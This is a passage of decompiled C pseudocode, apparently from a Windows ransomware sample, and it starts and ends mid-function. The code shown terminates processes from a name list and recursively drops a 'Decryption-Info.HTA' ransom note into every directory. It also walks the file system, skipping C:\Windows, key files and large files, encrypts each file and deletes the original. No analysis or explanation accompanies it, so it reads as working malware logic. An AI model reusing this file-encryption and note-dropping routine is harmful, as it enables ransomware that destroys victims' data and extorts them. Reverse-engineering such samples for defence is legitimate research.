  v1 = (void (__stdcall *)(HANDLE))CloseHandle;
LABEL_2:
  if ( v0 < 9 )
  {
    Toolhelp32Snapshot = CreateToolhelp32Snapshot(0xFu, 0);
    pe.dwSize = 296;
    for ( i = Process32First(Toolhelp32Snapshot, &pe); ; i = Process32Next(Toolhelp32Snapshot, &pe) )
    {
      while ( 1 )
      {
        if ( !i )
        {
          v1(Toolhelp32Snapshot);
          v10 = ++v0;
          goto LABEL_2;
        }
        v4 = &v12[3 * v0];
        if ( *((_DWORD *)v4 + 5) >= 0x10u )
          v4 = *(_QWORD **)v4;
        v5 = strcmp(pe.szExeFile, (const char *)v4);
        if ( v5 )
          v5 = v5 < 0 ? -1 : 1;
        if ( !v5 )
          break;
LABEL_13:
        i = Process32Next(Toolhelp32Snapshot, &pe);
      }
      v6 = OpenProcess(1u, 0, pe.th32ProcessID);
      v7 = v6;
      if ( !v6 )
      {
        v1 = (void (__stdcall *)(HANDLE))CloseHandle;
        goto LABEL_13;
      }
      TerminateProcess(v6, 9u);
      v8 = v7;
      v1 = (void (__stdcall *)(HANDLE))CloseHandle;
      CloseHandle(v8);
    }
  }
  v24 = -1;
  `eh vector destructor iterator'(v12, 0x18u, 9u, (void (__thiscall *)(void *))sub_4199E0);
}
// 410303: bad sp value at call
// 4102A5: bad sp value at call
// 46C502: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *));
// 46C8AE: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 40FF70: using guessed type char var_2C[24];

//----- (00410330) --------------------------------------------------------
int __cdecl sub_410330(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        _BYTE *a14,
        int a15,
        int a16,
        int a17,
        int a18,
        unsigned int a19,
        _DWORD *a20,
        int a21,
        int a22,
        int a23,
        unsigned int a24,
        unsigned int a25)
{
  const WCHAR *v25; // eax
  int v26; // esi
  char *v27; // eax
  int v28; // eax
  LPCWSTR *v29; // ecx
  void *v30; // edx
  LPCWSTR *v31; // ecx
  void *v32; // edx
  LPCWSTR *v33; // ecx
  void *v34; // edx
  _DWORD *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  HANDLE v38; // esi
  int v39; // edi
  int v40; // esi
  unsigned __int64 v41; // kr00_8
  LPCWSTR *v42; // ecx
  WCHAR *v43; // edx
  void *v44; // esi
  unsigned int v45; // ecx
  unsigned int v46; // edx
  _BYTE *v47; // ecx
  unsigned int v48; // edx
  _BYTE *v49; // ecx
  unsigned int v50; // edx
  _BYTE *v51; // ecx
  unsigned int v52; // edx
  _BYTE *v53; // ecx
  int result; // eax
  _DWORD v55[6]; // [esp-60h] [ebp-440h] BYREF
  _DWORD v56[6]; // [esp-48h] [ebp-428h] BYREF
  _DWORD v57[6]; // [esp-30h] [ebp-410h] BYREF
  _DWORD v58[4]; // [esp-18h] [ebp-3F8h] BYREF
  int v59; // [esp-8h] [ebp-3E8h]
  LPCWSTR *v60; // [esp-4h] [ebp-3E4h]
  unsigned int v61; // [esp+0h] [ebp-3E0h] BYREF
  int v62[5]; // [esp+14h] [ebp-3CCh] BYREF
  unsigned int v63; // [esp+28h] [ebp-3B8h]
  int v64[5]; // [esp+2Ch] [ebp-3B4h] BYREF
  unsigned int v65; // [esp+40h] [ebp-3A0h]
  int v66[5]; // [esp+44h] [ebp-39Ch] BYREF
  unsigned int v67; // [esp+58h] [ebp-388h]
  _DWORD *v68; // [esp+64h] [ebp-37Ch]
  _DWORD *v69; // [esp+68h] [ebp-378h]
  HANDLE hFindFile; // [esp+6Ch] [ebp-374h]
  _DWORD *v71; // [esp+70h] [ebp-370h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+74h] [ebp-36Ch] BYREF
  _DWORD v73[44]; // [esp+2C4h] [ebp-11Ch] BYREF
  int v74[5]; // [esp+374h] [ebp-6Ch] BYREF
  unsigned int v75; // [esp+388h] [ebp-58h]
  unsigned int v76; // [esp+38Ch] [ebp-54h]
  LPCWSTR *v77; // [esp+390h] [ebp-50h]
  LPCWSTR *v78; // [esp+394h] [ebp-4Ch]
  LPCWSTR *v79; // [esp+398h] [ebp-48h]
  LPCWSTR *v80; // [esp+39Ch] [ebp-44h]
  LPCWSTR *v81; // [esp+3A0h] [ebp-40h]
  LPCWSTR lpFileName[5]; // [esp+3A4h] [ebp-3Ch] BYREF
  unsigned int v83; // [esp+3B8h] [ebp-28h]
  int v84; // [esp+3BCh] [ebp-24h]
  unsigned __int64 v85; // [esp+3C0h] [ebp-20h] BYREF
  int v86; // [esp+3C8h] [ebp-18h]
  int *v87; // [esp+3D0h] [ebp-10h]
  int v88; // [esp+3DCh] [ebp-4h]

  v87 = (int *)&v61;
  v71 = a1;
  v88 = 5;
  v85 = 0i64;
  v86 = 0;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v88) = 6;
  v25 = (const WCHAR *)lpFileName;
  if ( v83 >= 8 )
    v25 = lpFileName[0];
  hFindFile = FindFirstFileW(v25, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  do
  {
    v26 = sub_4194E0((int)v62, FindFileData.cFileName);
    LOBYTE(v88) = 7;
    v27 = (char *)sub_4229A0((int)v64, v71, (unsigned __int16 *)"\\");
    LOBYTE(v88) = 8;
    v28 = sub_421BF0((int)v66, v27, v26);
    LOBYTE(v88) = 9;
    sub_419470((int)lpFileName, v28);
    LOBYTE(v88) = 8;
    if ( v67 >= 8 )
    {
      v29 = (LPCWSTR *)(2 * v67 + 2);
      v81 = v29;
      v30 = (void *)v66[0];
      if ( (unsigned int)v29 >= 0x1000 )
      {
        v29 = (LPCWSTR *)(2 * v67 + 37);
        v81 = v29;
        v30 = *(void **)(v66[0] - 4);
        if ( (unsigned int)(v66[0] - (_DWORD)v30 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v60 = v29;
      sub_46C87D(v30);
    }
    v66[4] = 0;
    v67 = 7;
    LOWORD(v66[0]) = 0;
    LOBYTE(v88) = 7;
    if ( v65 >= 8 )
    {
      v31 = (LPCWSTR *)(2 * v65 + 2);
      v80 = v31;
      v32 = (void *)v64[0];
      if ( (unsigned int)v31 >= 0x1000 )
      {
        v31 = (LPCWSTR *)(2 * v65 + 37);
        v80 = v31;
        v32 = *(void **)(v64[0] - 4);
        if ( (unsigned int)(v64[0] - (_DWORD)v32 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v60 = v31;
      sub_46C87D(v32);
    }
    v64[4] = 0;
    v65 = 7;
    LOWORD(v64[0]) = 0;
    LOBYTE(v88) = 6;
    if ( v63 >= 8 )
    {
      v33 = (LPCWSTR *)(2 * v63 + 2);
      v79 = v33;
      v34 = (void *)v62[0];
      if ( (unsigned int)v33 >= 0x1000 )
      {
        v33 = (LPCWSTR *)(2 * v63 + 37);
        v79 = v33;
        v34 = *(void **)(v62[0] - 4);
        if ( (unsigned int)(v62[0] - (_DWORD)v34 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v60 = v33;
      sub_46C87D(v34);
    }
    v62[4] = 0;
    v63 = 7;
    LOWORD(v62[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".") && lstrcmpW(FindFileData.cFileName, L"..") )
      {
        sub_4229A0((int)v74, lpFileName, L"\\Decryption-Info.HTA");
        LOBYTE(v88) = 13;
        memset(v73, 0, sizeof(v73));
        sub_419E50(v73, (int)v74, 2, v59, (int)v60);
        LOBYTE(v88) = 14;
        v35 = &a20;
        if ( a25 >= 8 )
          v35 = a20;
        sub_426940((int)v73, (int)v35, a24);
        sub_419E10(v73);
        LOBYTE(v88) = 13;
        sub_409FC0(v73);
        v88 = 12;
        v60 = lpFileName;
        if ( v86 == HIDWORD(v85) )
        {
          sub_423CD0((int *)&v85, SHIDWORD(v85), v60);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v85), v60);
          HIDWORD(v85) += 24;
        }
        LOBYTE(v88) = 6;
        if ( v75 >= 8 )
        {
          v36 = (LPCWSTR *)(2 * v75 + 2);
          v78 = v36;
          v37 = (void *)v74[0];
          if ( (unsigned int)v36 >= 0x1000 )
          {
            v36 = (LPCWSTR *)(2 * v75 + 37);
            v78 = v36;
            v37 = *(void **)(v74[0] - 4);
            if ( (unsigned int)(v74[0] - (_DWORD)v37 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v60 = v36;
          sub_46C87D(v37);
        }
        v74[4] = 0;
        v75 = 7;
        LOWORD(v74[0]) = 0;
      }
    }
    else
    {
      v88 = 6;
    }
    v38 = hFindFile;
  }
  while ( FindNextFileW(hFindFile, &FindFileData) );
  FindClose(v38);
  v41 = v85;
  v39 = HIDWORD(v41);
  v40 = v41;
  v84 = v85;
  while ( v40 != v39 )
  {
    hFindFile = v58;
    sub_419530(v58, &a20);
    LOBYTE(v88) = 16;
    v71 = v57;
    sub_419530(v57, &a14);
    LOBYTE(v88) = 17;
    v69 = v56;
    sub_419530(v56, &a8);
    LOBYTE(v88) = 18;
    v68 = v55;
    sub_419530(v55, &a2);
    LOBYTE(v88) = 6;
    sub_410330(
      v40,
      v55[0],
      v55[1],
      v55[2],
      v55[3],
      v55[4],
      v55[5],
      v56[0],
      v56[1],
      v56[2],
      v56[3],
      v56[4],
      v56[5],
      v57[0],
      v57[1],
      v57[2],
      v57[3],
      v57[4],
      v57[5],
      v58[0],
      v58[1],
      v58[2],
      v58[3],
      v59,
      v60);
    v40 += 24;
    v84 = v40;
  }
  LOBYTE(v88) = 5;
  if ( v83 >= 8 )
  {
    v42 = (LPCWSTR *)(2 * v83 + 2);
    v77 = v42;
    v43 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v42 >= 0x1000 )
    {
      v42 = (LPCWSTR *)(2 * v83 + 37);
      v77 = v42;
      v43 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v43 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v60 = v42;
    sub_46C87D(v43);
  }
  lpFileName[4] = 0;
  v83 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v88) = 4;
  if ( (_DWORD)v85 )
  {
    v60 = (LPCWSTR *)v85;
    sub_425130(v85, SHIDWORD(v85));
    v44 = (void *)v85;
    v45 = 24 * ((v86 - (int)v85) / 24);
    v76 = v45;
    if ( v45 >= 0x1000 )
    {
      v45 += 35;
      v76 = v45;
      v44 = *(void **)(v85 - 4);
      if ( (unsigned int)(v85 - (_DWORD)v44 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v60 = (LPCWSTR *)v45;
    sub_46C87D(v44);
    v85 = 0i64;
    v86 = 0;
  }
  v88 = 2;
  if ( a7 >= 8 )
  {
    v46 = 2 * a7 + 2;
    v47 = a2;
    if ( v46 >= 0x1000 )
    {
      v46 = 2 * a7 + 37;
      v47 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v47 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v61 = v46;
    sub_46C87D(v47);
  }
  a6 = 0;
  a7 = 7;
  LOWORD(a2) = 0;
  LOBYTE(v88) = 1;
  if ( a13 >= 8 )
  {
    v48 = 2 * a13 + 2;
    v49 = a8;
    if ( v48 >= 0x1000 )
    {
      v48 = 2 * a13 + 37;
      v49 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v49 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v61 = v48;
    sub_46C87D(v49);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v88) = 0;
  if ( a19 >= 8 )
  {
    v50 = 2 * a19 + 2;
    v51 = a14;
    if ( v50 >= 0x1000 )
    {
      v50 = 2 * a19 + 37;
      v51 = (_BYTE *)*((_DWORD *)a14 - 1);
      if ( (unsigned int)(a14 - v51 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v61 = v50;
    sub_46C87D(v51);
  }
  a18 = 0;
  a19 = 7;
  LOWORD(a14) = 0;
  v88 = -1;
  if ( a25 >= 8 )
  {
    v52 = 2 * a25 + 2;
    v53 = a20;
    if ( v52 >= 0x1000 )
    {
      v52 = 2 * a25 + 37;
      v53 = (_BYTE *)*(a20 - 1);
      if ( (unsigned int)((char *)a20 - v53 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v61 = v52;
    sub_46C87D(v53);
  }
  a24 = 0;
  a25 = 7;
  result = 0;
  LOWORD(a20) = 0;
  return result;
}
// 4CD168: using guessed type wchar_t asc_4CD168[3];
// 4CD25C: using guessed type wchar_t aDecryptionInfo_0[21];
// 410330: using guessed type _DWORD var_11C[44];

//----- (00410A50) --------------------------------------------------------
int __cdecl sub_410A50(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // edi
  const WCHAR *v27; // eax
  HANDLE v28; // ebx
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  bool v41; // bl
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  WCHAR *v45; // eax
  LPCWSTR *v46; // ecx
  void *v47; // edx
  _DWORD *v48; // eax
  int v49; // ecx
  LPCWSTR *v50; // ecx
  void *v51; // edx
  int v52; // ecx
  int v53; // ecx
  int v54; // ecx
  int v55; // ecx
  char *v56; // eax
  int v57; // ecx
  char v58; // bl
  LPCWSTR *v59; // ecx
  void *v60; // edx
  const wchar_t *v61; // eax
  LPCWSTR *v62; // ecx
  void *v63; // edx
  int v64; // ecx
  int v65; // edi
  int v66; // esi
  unsigned __int64 v67; // kr00_8
  LPCWSTR *v68; // ecx
  WCHAR *v69; // edx
  void *v70; // esi
  unsigned int v71; // ecx
  int v72; // edx
  _BYTE *v73; // ecx
  unsigned int v74; // edx
  _BYTE *v75; // ecx
  unsigned int v76; // edx
  _BYTE *v77; // ecx
  unsigned int v78; // edx
  _BYTE *v79; // ecx
  int result; // eax
  wchar_t *v81[5]; // [esp-78h] [ebp-430h] BYREF
  unsigned int v82; // [esp-64h] [ebp-41Ch] BYREF
  _BYTE *v83; // [esp-60h] [ebp-418h] BYREF
  int v84; // [esp-5Ch] [ebp-414h]
  int v85; // [esp-58h] [ebp-410h]
  int v86; // [esp-54h] [ebp-40Ch]
  int v87; // [esp-50h] [ebp-408h]
  unsigned int v88; // [esp-4Ch] [ebp-404h] BYREF
  _BYTE *v89; // [esp-48h] [ebp-400h] BYREF
  int v90; // [esp-44h] [ebp-3FCh]
  int v91; // [esp-40h] [ebp-3F8h]
  int v92; // [esp-3Ch] [ebp-3F4h]
  int v93; // [esp-38h] [ebp-3F0h]
  unsigned int v94; // [esp-34h] [ebp-3ECh]
  _BYTE *v95; // [esp-30h] [ebp-3E8h] BYREF
  int v96; // [esp-2Ch] [ebp-3E4h]
  int v97; // [esp-28h] [ebp-3E0h]
  int v98; // [esp-24h] [ebp-3DCh]
  int v99; // [esp-20h] [ebp-3D8h]
  unsigned int v100; // [esp-1Ch] [ebp-3D4h]
  _BYTE *v101; // [esp-18h] [ebp-3D0h] BYREF
  int v102; // [esp-14h] [ebp-3CCh]
  int v103; // [esp-10h] [ebp-3C8h]
  int v104; // [esp-Ch] [ebp-3C4h]
  int v105; // [esp-8h] [ebp-3C0h]
  LPCWSTR *v106; // [esp-4h] [ebp-3BCh]
  unsigned int v107; // [esp+0h] [ebp-3B8h] BYREF
  int v108[5]; // [esp+10h] [ebp-3A8h] BYREF
  unsigned int v109; // [esp+24h] [ebp-394h]
  int v110[5]; // [esp+28h] [ebp-390h] BYREF
  unsigned int v111; // [esp+3Ch] [ebp-37Ch]
  int v112[5]; // [esp+40h] [ebp-378h] BYREF
  unsigned int v113; // [esp+54h] [ebp-364h]
  int v114[5]; // [esp+58h] [ebp-360h] BYREF
  unsigned int v115; // [esp+6Ch] [ebp-34Ch]
  int v116[5]; // [esp+70h] [ebp-348h] BYREF
  unsigned int v117; // [esp+84h] [ebp-334h]
  int v118[5]; // [esp+88h] [ebp-330h] BYREF
  unsigned int v119; // [esp+9Ch] [ebp-31Ch]
  _BYTE **v120; // [esp+A0h] [ebp-318h]
  int v121[4]; // [esp+ACh] [ebp-30Ch] BYREF
  int v122; // [esp+BCh] [ebp-2FCh]
  unsigned int v123; // [esp+C0h] [ebp-2F8h]
  unsigned int *v124; // [esp+C4h] [ebp-2F4h]
  unsigned int *v125; // [esp+C8h] [ebp-2F0h]
  __int64 v126; // [esp+CCh] [ebp-2ECh]
  wchar_t **v127; // [esp+D4h] [ebp-2E4h]
  _BYTE **v128; // [esp+D8h] [ebp-2E0h]
  _DWORD *v129; // [esp+DCh] [ebp-2DCh]
  unsigned int v130; // [esp+E0h] [ebp-2D8h]
  int v131; // [esp+E4h] [ebp-2D4h]
  HANDLE hFindFile; // [esp+E8h] [ebp-2D0h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+ECh] [ebp-2CCh] BYREF
  int v134[5]; // [esp+33Ch] [ebp-7Ch] BYREF
  unsigned int v135; // [esp+350h] [ebp-68h]
  unsigned int v136; // [esp+354h] [ebp-64h]
  LPCWSTR *v137; // [esp+358h] [ebp-60h]
  LPCWSTR *v138; // [esp+35Ch] [ebp-5Ch]
  LPCWSTR *v139; // [esp+360h] [ebp-58h]
  LPCWSTR *v140; // [esp+364h] [ebp-54h]
  LPCWSTR *v141; // [esp+368h] [ebp-50h]
  LPCWSTR *v142; // [esp+36Ch] [ebp-4Ch]
  LPCWSTR *v143; // [esp+370h] [ebp-48h]
  LPCWSTR *v144; // [esp+374h] [ebp-44h]
  LPCWSTR *v145; // [esp+378h] [ebp-40h]
  int v146; // [esp+37Ch] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+380h] [ebp-38h] BYREF
  unsigned int v148; // [esp+394h] [ebp-24h]
  unsigned __int64 v149; // [esp+398h] [ebp-20h] BYREF
  int v150; // [esp+3A0h] [ebp-18h]
  int *v151; // [esp+3A8h] [ebp-10h]
  int v152; // [esp+3B4h] [ebp-4h]
  int savedregs; // [esp+3B8h] [ebp+0h] BYREF

  v151 = (int *)&v107;
  v129 = a1;
  v130 = a14;
  v26 = 0;
  v131 = 0;
  v152 = 5;
  v149 = 0i64;
  v150 = 0;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v152) = 6;
  v27 = (const WCHAR *)lpFileName;
  if ( v148 >= 8 )
    v27 = lpFileName[0];
  hFindFile = FindFirstFileW(v27, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  v28 = hFindFile;
  do
  {
    v29 = sub_4194E0((int)v114, FindFileData.cFileName);
    LOBYTE(v152) = 7;
    v30 = (char *)sub_4229A0((int)v116, v129, (unsigned __int16 *)"\\");
    LOBYTE(v152) = 8;
    v31 = sub_421BF0((int)v118, v30, v29);
    LOBYTE(v152) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v152) = 8;
    if ( v119 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v119 + 2);
      v145 = v32;
      v33 = (void *)v118[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v119 + 37);
        v145 = v32;
        v33 = *(void **)(v118[0] - 4);
        if ( (unsigned int)(v118[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v106 = v32;
      sub_46C87D(v33);
    }
    v118[4] = 0;
    v119 = 7;
    LOWORD(v118[0]) = 0;
    LOBYTE(v152) = 7;
    if ( v117 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v117 + 2);
      v144 = v34;
      v35 = (void *)v116[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v117 + 37);
        v144 = v34;
        v35 = *(void **)(v116[0] - 4);
        if ( (unsigned int)(v116[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v106 = v34;
      sub_46C87D(v35);
    }
    v116[4] = 0;
    v117 = 7;
    LOWORD(v116[0]) = 0;
    LOBYTE(v152) = 6;
    if ( v115 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v115 + 2);
      v143 = v36;
      v37 = (void *)v114[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v115 + 37);
        v143 = v36;
        v37 = *(void **)(v114[0] - 4);
        if ( (unsigned int)(v114[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v106 = v36;
      sub_46C87D(v37);
    }
    v114[4] = 0;
    v115 = 7;
    LOWORD(v114[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v64) == -1 )
      {
        v106 = lpFileName;
        if ( v150 == HIDWORD(v149) )
        {
          sub_423CD0((int *)&v149, SHIDWORD(v149), v106);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v149), v106);
          HIDWORD(v149) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v152) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v148 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( !v39 )
      {
        LOBYTE(v152) = 6;
        continue;
      }
      fclose(v39);
      v40 = (WCHAR *)sub_421E60((int)v112, (unsigned int *)lpFileName, (int)v106);
      LOBYTE(v152) = 11;
      v41 = sub_404BC0(v40);
      LOBYTE(v152) = 10;
      v42 = v113;
      if ( v113 >= 8 )
      {
        v43 = (LPCWSTR *)(2 * v113 + 2);
        v142 = v43;
        v44 = (void *)v112[0];
        if ( (unsigned int)v43 >= 0x1000 )
        {
          v43 = (LPCWSTR *)(2 * v113 + 37);
          v142 = v43;
          v44 = *(void **)(v112[0] - 4);
          if ( (unsigned int)(v112[0] - (_DWORD)v44 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v106 = v43;
        sub_46C87D(v44);
      }
      v112[4] = 0;
      v113 = 7;
      LOWORD(v112[0]) = 0;
      if ( v41 )
      {
        v45 = (WCHAR *)sub_421E60((int)v110, (unsigned int *)lpFileName, v42);
        LOBYTE(v152) = 13;
        v126 = sub_404B60(v45);
        LOBYTE(v152) = 10;
        v42 = v111;
        if ( v111 >= 8 )
        {
          v46 = (LPCWSTR *)(2 * v111 + 2);
          v141 = v46;
          v47 = (void *)v110[0];
          if ( (unsigned int)v46 >= 0x1000 )
          {
            v46 = (LPCWSTR *)(2 * v111 + 37);
            v141 = v46;
            v47 = *(void **)(v110[0] - 4);
            if ( (unsigned int)(v110[0] - (_DWORD)v47 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v106 = v46;
          sub_46C87D(v47);
        }
        v110[4] = 0;
        v111 = 7;
        LOWORD(v110[0]) = 0;
      }
      v48 = (_DWORD *)sub_421E60((int)v108, (unsigned int *)lpFileName, v42);
      LOBYTE(v152) = 15;
      sub_404120(v48, (int)v134);
      LOBYTE(v152) = 17;
      v49 = v109;
      if ( v109 >= 8 )
      {
        v50 = (LPCWSTR *)(2 * v109 + 2);
        v140 = v50;
        v51 = (void *)v108[0];
        if ( (unsigned int)v50 >= 0x1000 )
        {
          v50 = (LPCWSTR *)(2 * v109 + 37);
          v140 = v50;
          v51 = *(void **)(v108[0] - 4);
          if ( (unsigned int)(v108[0] - (_DWORD)v51 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v106 = v50;
        sub_46C87D(v51);
      }
      v108[4] = 0;
      v109 = 7;
      LOWORD(v108[0]) = 0;
      if ( v126 > 600000
        || sub_4191C0((char *)lpFileName, L"C:\\Windows", v49) != -1
        || sub_4191C0((char *)lpFileName, L"pubkey.txt", v52) != -1
        || sub_4191C0((char *)lpFileName, L"IDo.txt", v53) != -1
        || sub_4191C0((char *)lpFileName, L"Decryption-Info", v54) != -1 )
      {
        goto LABEL_47;
      }
      sub_421E60((int)v121, (unsigned int *)&a21, v55);
      LOBYTE(v152) = 19;
      v26 |= 1u;
      v131 = v26;
      v56 = (char *)v121;
      if ( v123 >= 8 )
        v56 = (char *)v121[0];
      if ( sub_403F60(v134, v56, v122) && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v57) == -1 )
        v58 = 1;
      else
LABEL_47:
        v58 = 0;
      v152 = 17;
      if ( (v131 & 1) != 0 )
      {
        v131 &= ~1u;
        LOBYTE(v152) = 17;
        if ( v123 >= 8 )
        {
          v59 = (LPCWSTR *)(2 * v123 + 2);
          v139 = v59;
          v60 = (void *)v121[0];
          if ( (unsigned int)v59 >= 0x1000 )
          {
            v59 = (LPCWSTR *)(2 * v123 + 37);
            v139 = v59;
            v60 = *(void **)(v121[0] - 4);
            if ( (unsigned int)(v121[0] - (_DWORD)v60 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v106 = v59;
          sub_46C87D(v60);
        }
        v122 = 0;
        v123 = 7;
        LOWORD(v121[0]) = 0;
      }
      if ( v58 )
      {
        v120 = &v101;
        sub_419530(&v101, &a21);
        LOBYTE(v152) = 21;
        v125 = (unsigned int *)&v95;
        sub_419530(&v95, &a8);
        LOBYTE(v152) = 22;
        v124 = (unsigned int *)&v89;
        sub_419530(&v89, &a15);
        LOBYTE(v152) = 23;
        v128 = &v83;
        sub_419BE0(&v83, &a2);
        LOBYTE(v152) = 24;
        v127 = v81;
        sub_419530(v81, lpFileName);
        LOBYTE(v152) = 17;
        sub_409110(
          v130,
          (int)&savedregs,
          v26,
          v29,
          v81[0],
          (int)v81[1],
          (int)v81[2],
          (int)v81[3],
          (int)v81[4],
          v82,
          v83,
          v84,
          v85,
          v86,
          v87,
          v88,
          v89,
          v90,
          v91,
          v92,
          v93,
          v94,
          v95,
          v96,
          v97,
          v98,
          v99,
          v100,
          v101,
          v102,
          v103,
          v104,
          v105,
          (unsigned int)v106);
        v61 = (const wchar_t *)lpFileName;
        if ( v148 >= 8 )
          v61 = lpFileName[0];
        _wremove(v61);
      }
      LOBYTE(v152) = 10;
      if ( v135 >= 8 )
      {
        v62 = (LPCWSTR *)(2 * v135 + 2);
        v138 = v62;
        v63 = (void *)v134[0];
        if ( (unsigned int)v62 >= 0x1000 )
        {
          v62 = (LPCWSTR *)(2 * v135 + 37);
          v138 = v62;
          v63 = *(void **)(v134[0] - 4);
          if ( (unsigned int)(v134[0] - (_DWORD)v63 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v106 = v62;
        sub_46C87D(v63);
      }
      v134[4] = 0;
      v135 = 7;
      LOWORD(v134[0]) = 0;
      v152 = 6;
      v26 = v131;
    }
    v28 = hFindFile;
  }
  while ( FindNextFileW(v28, &FindFileData) );
  FindClose(v28);
  v67 = v149;
  v65 = HIDWORD(v67);
  v66 = v67;
  v146 = v149;
  while ( v66 != v65 )
  {
    v127 = (wchar_t **)&v101;
    sub_419530(&v101, &a21);
    LOBYTE(v152) = 28;
    v128 = &v95;
    sub_419530(&v95, &a15);
    LOBYTE(v152) = 29;
    v94 = v130;
    v124 = &v88;
    sub_419530(&v88, &a8);
    LOBYTE(v152) = 30;
    v125 = &v82;
    sub_419BE0(&v82, &a2);
    LOBYTE(v152) = 6;
    sub_410A50(
      v66,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101,
      v102,
      v103,
      v104,
      v105,
      v106);
    v66 += 24;
    v146 = v66;
  }
  LOBYTE(v152) = 5;
  if ( v148 >= 8 )
  {
    v68 = (LPCWSTR *)(2 * v148 + 2);
    v137 = v68;
    v69 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v68 >= 0x1000 )
    {
      v68 = (LPCWSTR *)(2 * v148 + 37);
      v137 = v68;
      v69 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v106 = v68;
    sub_46C87D(v69);
  }
  lpFileName[4] = 0;
  v148 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v152) = 4;
  if ( (_DWORD)v149 )
  {
    v106 = (LPCWSTR *)v149;
    sub_425130(v149, SHIDWORD(v149));
    v70 = (void *)v149;
    v71 = 24 * ((v150 - (int)v149) / 24);
    v136 = v71;
    if ( v71 >= 0x1000 )
    {
      v71 += 35;
      v136 = v71;
      v70 = *(void **)(v149 - 4);
